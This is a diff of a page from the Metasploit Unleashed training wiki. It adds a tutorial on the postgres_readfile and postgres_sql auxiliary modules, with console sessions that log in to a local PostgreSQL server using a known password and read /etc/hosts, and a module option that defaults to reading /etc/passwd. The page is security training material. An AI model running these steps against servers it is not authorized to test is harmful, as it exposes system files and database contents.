@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Admin Postgres Auxiliary Modules - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Admin_Postgres_Auxiliary_Modules" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Admin_Postgres_Auxiliary_Modules&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Admin_Postgres_Auxiliary_Modules&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Admin_Postgres_Auxiliary_Modules&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,263 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Admin Postgres Auxiliary Modules</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Admin_Postgres_Auxiliary_Modules#column-one">navigation</a>, <a href="Admin_Postgres_Auxiliary_Modules#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Admin_Postgres_Auxiliary_Modules#postgres_readfile"><span class="tocnumber">1</span> <span class="toctext">postgres_readfile</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Admin_Postgres_Auxiliary_Modules#postgres_sql"><span class="tocnumber">2</span> <span class="toctext">postgres_sql</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="postgres_readfile"> postgres_readfile </span></h2>
+<p>The <b>"postgres_readfile"</b> module, when provided with valid credentials for a PostgreSQL server, will read and display files of your choosing on the server.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/admin/postgres/postgres_readfile</span> 
+msf auxiliary(<span style='color:#ff0000;'>postgres_readfile</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/admin/postgres/postgres_readfile):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
+   RFILE     /etc/passwd      yes       The remote file
+   RHOST                      yes       The target address
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output</pre>
+<br />
+In order to configure the module, we set the PASSWORD and RHOST values, set RFILE as the file we wish to read and let the module run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>postgres_readfile</span>) > <span style='color:#13C16A;'>set PASSWORD toor</span>
+PASSWORD => toor
+msf auxiliary(<span style='color:#ff0000;'>postgres_readfile</span>) > <span style='color:#13C16A;'>set RFILE /etc/hosts</span> 
+RFILE => /etc/hosts
+msf auxiliary(<span style='color:#ff0000;'>postgres_readfile</span>) > <span style='color:#13C16A;'>set RHOST 127.0.0.1</span>
+RHOST => 127.0.0.1
+msf auxiliary(<span style='color:#ff0000;'>postgres_readfile</span>) > <span style='color:#13C16A;'>run</span>
+
+Query Text: 'CREATE TEMP TABLE UnprtSRXpcuMpN (INPUT TEXT);
+			COPY UnprtSRXpcuMpN FROM '/etc/hosts';
+			SELECT * FROM UnprtSRXpcuMpN'
+======================================================================================================================================
+
+    input
+    -----
+    127.0.0.1       localhost
+    127.0.1.1       ph33r
+    
+    # The following lines are desirable for IPv6 capable hosts
+    ::1     ip6-localhost ip6-loopback
+    fe00::0 ip6-localnet
+    ff00::0 ip6-mcastprefix
+    ff02::1 ip6-allnodes
+    ff02::2 ip6-allrouters
+    ff02::3 ip6-allhosts
+
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>postgres_readfile</span>) ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="postgres_sql"> postgres_sql </span></h2>
+<p>The <b>"postgres_sql"</b> module, when provided with valid credentials for a PostgreSQL server, will perform queries of your choosing and return the results.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/admin/postgres/postgres_sql</span>
+msf auxiliary(<span style='color:#ff0000;'>postgres_sql</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/admin/postgres/postgres_sql):
+
+   Name           Current Setting   Required  Description
+   ----           ---------------   --------  -----------
+   DATABASE       template1         yes       The database to authenticate against
+   PASSWORD                         no        The password for the specified username. Leave blank for a random password.
+   RETURN_ROWSET  true              no        Set to true to see query result sets
+   RHOST                            yes       The target address
+   RPORT          5432              yes       The target port
+   SQL            select version()  no        The SQL query to execute
+   USERNAME       postgres          yes       The username to authenticate as
+   VERBOSE        false             no        Enable verbose output</pre>
+<br />
+The required configuration for this module is minimal as we will just set our PASSWORD and RHOST values, leave the default query to pull the server version, then let it run against our target.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>postgres_sql</span>) > <span style='color:#13C16A;'>set PASSWORD toor</span>
+PASSWORD => toor
+msf auxiliary(<span style='color:#ff0000;'>postgres_sql</span>) > <span style='color:#13C16A;'>set RHOST 127.0.0.1</span>
+RHOST => 127.0.0.1
+msf auxiliary(<span style='color:#ff0000;'>postgres_sql</span>) > <span style='color:#13C16A;'>run</span>
+
+Query Text: 'select version()'
+==============================
+
+    version
+    -------
+    PostgreSQL 8.3.8 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real (Ubuntu 4.3.2-1ubuntu11) 4.3.2
+
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>postgres_sql</span>) ></pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="http://www.offensive-security.com/w/index.php?title=Module_Reference&amp;action=edit&amp;redlink=1" class="new" title="Module Reference (page does not exist)">Module Reference</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Auxiliary_Modules&amp;action=edit&amp;redlink=1" class="new" title="Auxiliary Modules (page does not exist)">Auxiliary Modules</a> &gt; <a href="Admin_Modules" title="Admin Modules">Admin Modules</a> &gt; Admin Postgres Auxiliary Modules</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Admin_HTTP_Modules" title="Admin HTTP Modules" class="mw-redirect">Admin HTTP Modules</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=Admin_MSSQL_Modules&amp;action=edit&amp;redlink=1" class="new" title="Admin MSSQL Modules (page does not exist)">Admin MSSQL Modules</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=Admin_MySQL_Modules&amp;action=edit&amp;redlink=1" class="new" title="Admin MySQL Modules (page does not exist)">Admin MySQL Modules</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=Admin_Postgres_Modules&amp;action=edit&amp;redlink=1" class="new" title="Admin Postgres Modules (page does not exist)">Admin Postgres Modules</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 529/1000000
+Preprocessor generated node count: 2681/1000000
+Post‐expand include size: 5306/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:238-0!*!0!!en!*!* and timestamp 20131123232112 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Admin_Postgres_Auxiliary_Modules&amp;oldid=1243">http://www.offensive-security.com/w/index.php?title=Admin_Postgres_Auxiliary_Modules&amp;oldid=1243</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Admin_Modules&amp;action=edit&amp;redlink=1" class="new" title="Category:Admin Modules (page does not exist)">Admin Modules</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +748,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.145 secs. --></body></html>
